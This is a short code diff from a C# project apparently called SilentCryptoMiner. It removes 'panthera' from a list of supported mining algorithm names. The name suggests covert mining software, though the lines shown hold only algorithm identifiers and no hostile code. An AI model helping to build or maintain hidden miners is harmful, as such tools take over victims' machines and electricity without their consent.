@@ -365,7 +365,6 @@ namespace SilentCryptoMiner
             "gr",
             "cn/gpu",
             "cn/upx2",
-            "panthera",
             "argon2/chukwav2",
             "cn/ccx",
             "kawpow",
